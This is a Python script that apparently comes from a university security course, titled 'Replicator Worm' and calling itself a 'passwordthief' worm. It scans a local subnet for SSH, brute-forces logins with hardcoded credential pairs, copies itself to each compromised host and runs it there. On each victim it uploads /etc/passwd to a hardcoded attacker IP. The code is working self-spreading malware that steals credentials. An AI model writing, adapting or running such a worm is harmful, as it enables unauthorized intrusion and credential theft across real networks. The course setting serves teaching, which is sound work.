####################################################
#					REPLICATOR WORM
#
#		place replicator_worm.py in /tmp/ and run  
#		with two arguments.
####################################################
import paramiko
import sys
import socket
import nmap
import os
import fcntl
import struct
import tarfile
import netifaces
import urllib
import shutil
from subprocess import call

# The list of credentials to attempt
credList = [
('hello', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"
####################################################################
# Check if a file exists and is accessible. 
###################################################################
def file_accessible(filepath, mode):

	print "checking if " + INFECTED_MARKER_FILE + " exists on target system"
	try:
		f = open(filepath, mode)
		f.close()
	except IOError as e:
		return False
 	print "infected.txt was discovered at " + filepath
	return True
##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem(host):
	# Check if the system is infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	
	print "checking if " + host +" is infected"
	if file_accessible(INFECTED_MARKER_FILE,'r'):
		return True
	else:
		return False
	

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	print "Marking system is infected"
	f = open(INFECTED_MARKER_FILE,'w')
	f.write("Your computer is worming up... Oh, and it's also infected :(")
	f.close()
	print ("infected.txt added to system")
	pass	


###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	print "spreading and executing"

	#open ssh ftp
	sftpClient = sshClient.open_sftp()

	#propagation phase
	sftpClient.put("/tmp/passwordthief_worm.py" ,"/tmp/" + "passwordthief_worm.py")

	sftpClient.chmod("/tmp/passwordthief_worm.py",0777)
	
	#execution phase
	sshClient.exec_command("python /tmp/passwordthief_worm.py 2> /tmp/log.txt") 
	print("\nWorm sent and executed on target system")



############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, passWord, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	    
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	print"Attempting to connect using credentials. . . "
	try:
		sshClient.connect(host, username= userName, password=passWord)
		print "SUCCESS, WE'RE IN!"
		return 0
	except socket.error:
		print "Connection Error"
		return 3
	except paramiko.SSHException:
		print "Invalid Credentinals"
		return 1


	#pass

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	print "Waging dictionary attack on host:" + host
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	print "attempting to connect to " + host
	# The results of an attempt
	attemptResults = None
	

	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials funcwtion
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		print "\nattempting: username= " + username + " password= " + password 
		attemptResults = tryCredentials(host, username, password, ssh)
		if (attemptResults ==0):
			return (ssh,username,password)
		#pass	
	
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP():
	print ("getting IP of system")
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	for netFace in networkInterfaces:	
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 

			# Get the IP address
		if not addr == "127.0.0.1":
				
			# Save the IP addrss and break
			ipAddr = addr
			break	 


	return ipAddr


#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	print"scanning for hosts on network"
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	

# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	
	return liveHosts

####		 	BEGIN MAIN PROGRAM LOOP 	######
# If we are being run without command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
print ("\nBEGIN PASSWORDTHIEF WORM ATTACK!!!!")

originIp = "192.168.1.5"
myIP = getMyIP()

if len(sys.argv) < 2:
	
	#  If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.

	# Get the IP of the current system
		
	if isInfectedSystem(myIP):
		print("Sytem infection detected, our work here is done ;)")
		exit(0)
	# Otherwise, proceed with malice.
	else: 
		newssh =paramiko.SSHClient()
		newssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		newssh.connect(originIp,username="cpsc", password="1234")

		newsftp = newssh.open_sftp()
		newsftp.put("/etc/passwd" , "/tmp/"  + "passwd_" + myIP)
		#scp /etc/passwd cpsc@originIp:/tmp/
		newsftp.close()
		newssh.close()
		markInfected()
		print("Spreading with malice ;)")
	pass

print "MyIP is : " + myIP 
# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()
# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
print "Found hosts: ", networkHosts
networkHosts.remove(myIP)

print "potential targets: " 
for host in networkHosts:
	print host

# Go through the network hosts
for host in networkHosts:
	print "\nCURRENT TARGET:" + host
	# Try to attack this host
	sshInfo =  attackSystem(host)
	if (sshInfo):
		print "\nSSH INFO FROM DICTIONARY ATTACK:"
		print sshInfo
	else:
		print "Dictionary attack failed. . .  LOGIN UNSUCCESSFUL"
	
	
	# Did the attack succeed?
	if sshInfo:
		print "Gained access to: " + host
		print "\nTrying to spread"
		
		#open ssh ftp
		sftp = sshInfo[0].open_sftp()
		# Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		try:
			remotepath = '/tmp/infected.txt'
			localpath = '/tmp/infected.txt'
		#	 # Copy the file from the specified
		#	 # remote path to the specified
		# 	 # local path. If the file does exist
		#	 # at the remote path, then get()
		# 	 # will throw IOError exception
		# 	 # (that is, we know the system is
		# 	 # not yet infected).
		# 
			sftp.get(remotepath, localpath)
			print "System infection detected. . . ABORT ATTACK"
			sftp.close()
		except:
			sftp.close()
			print "This system should be infected"
			spreadAndExecute(sshInfo[0])
			print "Spreading complete"
			print " SINGLE TARGET COMPRIMISED...EXITING. . . "
			exit(0)

		print "\nEnding attack on " + host	
		

		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system
print "\nEnding PASSWORDTHIEF Attack "

			
		
	
	

